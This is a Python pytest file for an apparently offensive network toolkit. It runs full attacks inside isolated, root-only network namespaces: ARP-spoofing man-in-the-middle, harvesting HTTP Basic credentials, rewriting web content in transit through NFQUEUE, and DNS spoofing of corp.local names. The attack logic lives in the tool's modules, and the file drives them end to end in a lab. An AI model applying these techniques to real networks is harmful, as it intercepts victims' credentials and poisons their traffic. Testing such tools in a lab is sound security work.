"""End-to-end offensive workflows over the real namespaced segment (root only).

Opt-in: sudo REFORGE_LIVE=1 python -m pytest tests/test_live_e2e.py -q

Unlike test_live_mitm (which proves the MITM mechanism), these run a full attack
to its objective through the real kernel: a victim does real work (an HTTP login,
a DNS lookup) and the tool achieves the offensive result (harvested credential,
spoofed answer).
"""

from __future__ import annotations

import os
import subprocess
import threading
import time

import pytest

from reforge.testlab.netlab import SegmentLab, is_root, netns_exec

pytestmark = pytest.mark.skipif(
    not (is_root() and os.environ.get("REFORGE_LIVE") == "1"),
    reason="live e2e tests need root and REFORGE_LIVE=1",
)

ATTACKER_IFACE = "rf-atk"


def _attacker_mac() -> str:
    from scapy.all import get_if_hwaddr
    return get_if_hwaddr(ATTACKER_IFACE).lower()


def _gw_mac_in_victim(gw_ip: str) -> str | None:
    from reforge.testlab.netlab import neigh_table
    for line in neigh_table("rf-victim", "-4").splitlines():
        parts = line.split()
        if parts and parts[0] == gw_ip and "lladdr" in parts:
            return parts[parts.index("lladdr") + 1].lower()
    return None


class _Harvester:
    """Capture on the attacker interface and extract credentials in a thread."""

    def __init__(self, iface: str):
        from reforge.attacks.creds import CredentialExtractor
        from reforge.attacks.stream_harvester import StreamHarvester
        from reforge.capture.afpacket import AfPacketBackend
        self.backend = AfPacketBackend([iface])
        self.ce = CredentialExtractor()
        self.sh = StreamHarvester()
        self.creds: list = []
        self._run = threading.Event()
        self._t: threading.Thread | None = None

    def start(self):
        from scapy.layers.l2 import Ether
        self.backend.open()
        self._run.set()

        def loop():
            while self._run.is_set():
                for f in self.backend.recv_burst(64, 0.3):
                    try:
                        self.creds += self.ce.extract(Ether(f.data))
                        self.creds += self.sh.add_frame(f.data)
                    except Exception:  # noqa: BLE001, S110 - best-effort harvest
                        pass

        self._t = threading.Thread(target=loop, daemon=True)
        self._t.start()

    def stop(self):
        self._run.clear()
        if self._t:
            self._t.join(timeout=2.0)
        self.backend.close()


def test_http_credential_harvest_over_arp_mitm():
    from reforge.attacks.arp_mitm import ArpMitm

    server = None
    harv = None
    mitm = None
    with SegmentLab() as net:
        try:
            # a real HTTP server the victim will log into, in the gateway ns
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), f"MITM did not start: {mitm.warnings}"
            assert mitm.status()["forwarding_on"], "need IP forwarding to relay"

            # wait until the victim actually routes through us
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            flipped = False
            for _ in range(15):
                if _gw_mac_in_victim(net["gateway_ip4"]) == atk_mac:
                    flipped = True
                    break
                time.sleep(0.4)
            assert flipped, "victim never routed through the attacker"

            harv = _Harvester(ATTACKER_IFACE)
            harv.start()
            time.sleep(0.4)

            # the victim logs in over HTTP (Basic auth) -> traffic relays through us
            for _ in range(3):
                netns_exec("rf-victim", "curl", "-s", "-m", "3",
                           "-u", "admin:s3cr3t",
                           f"http://{net['gateway_ip4']}:8000/", "-o", "/dev/null",
                           check=False)
                time.sleep(0.4)
                if any(getattr(c, "username", "") == "admin" for c in harv.creds):
                    break

            users = {(getattr(c, "kind", ""), getattr(c, "username", ""),
                      getattr(c, "secret", "")) for c in harv.creds}
            assert ("http-basic", "admin", "s3cr3t") in users, \
                f"credential not harvested; saw {users}"
        finally:
            if harv is not None:
                harv.stop()
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate()
                server.wait(timeout=3)


def _wait_flip(gw_ip: str, atk_mac: str, tries: int = 15) -> bool:
    for _ in range(tries):
        if _gw_mac_in_victim(gw_ip) == atk_mac:
            return True
        time.sleep(0.4)
    return False


def test_inline_content_injection_reaches_the_victim():
    """Flagship inline manipulation delivered end to end: the victim requests a
    page through the MITM and receives content the NFQUEUE rewrote in flight."""
    import tempfile

    netfilterqueue = pytest.importorskip("netfilterqueue")
    assert netfilterqueue

    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter

    qnum = 34
    docroot = tempfile.mkdtemp(prefix="rf-doc-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BANNER=ORIGINAL-TOKEN\n")     # same length as the replacement

    server = mitm = runner = rt = None
    remove = []
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip4"]])
            for cmd in install:
                subprocess.run(cmd, check=True, capture_output=True)
            engine = RuleEngine([Rule("inject",
                                      parse_filter('Raw.load contains "ORIGINAL-TOKEN"'),
                                      [PayloadReplace(b"ORIGINAL-TOKEN", b"INJECTED-TOKEN")])])
            runner = NfqueueRunner(engine, queue_num=qnum)
            rt = threading.Thread(target=runner.run, daemon=True)
            rt.start()
            time.sleep(0.6)

            # victim fetches the page THROUGH the MITM; the body is rewritten in flight
            got = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "curl", "-s", "-m", "4",
                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
                got = r.stdout
                if "INJECTED-TOKEN" in got:
                    break
                time.sleep(0.3)
            assert "INJECTED-TOKEN" in got, f"victim did not receive injected content: {got!r}"
            assert runner.stats.modified >= 1
        finally:
            if runner is not None:
                runner.stop()
            if rt is not None:
                rt.join(timeout=2.0)
            for cmd in remove:
                subprocess.run(cmd, check=False, capture_output=True)
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_dns_spoof_answers_the_victims_lookup():
    """The victim's DNS lookup (routed through the MITM) is answered by the tool
    with the attacker's IP — exercising the DNS-spoof parser live."""
    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.attacks.dns_spoof import DnsSpoofer

    mitm = spoof = sink = None
    with SegmentLab() as net:
        try:
            # a silent UDP sink on the gateway:53 so the victim's query isn't met
            # with an ICMP port-unreachable — the on-path spoof is then the only
            # answer that comes back
            sink_code = (
                "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
                f"s.bind(('{net['gateway_ip4']}',53))\n"
                "while True: s.recvfrom(2048)")
            sink = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-c", sink_code],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            spoof = DnsSpoofer(ATTACKER_IFACE, {"*.corp.local": "10.9.9.1"})
            spoof.start()
            time.sleep(0.6)

            # the victim resolves a name via the gateway (its DNS goes through us)
            answer = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "dig", "+short", "+time=2", "+tries=1",
                               f"@{net['gateway_ip4']}", "intranet.corp.local",
                               check=False)
                answer = (r.stdout or "").strip()
                if "10.9.9.1" in answer:
                    break
                time.sleep(0.3)
            assert "10.9.9.1" in answer, f"victim was not poisoned; got {answer!r}"
        finally:
            if spoof is not None:
                spoof.stop()
            if mitm is not None:
                mitm.stop()
            if sink is not None:
                sink.terminate(); sink.wait(timeout=3)
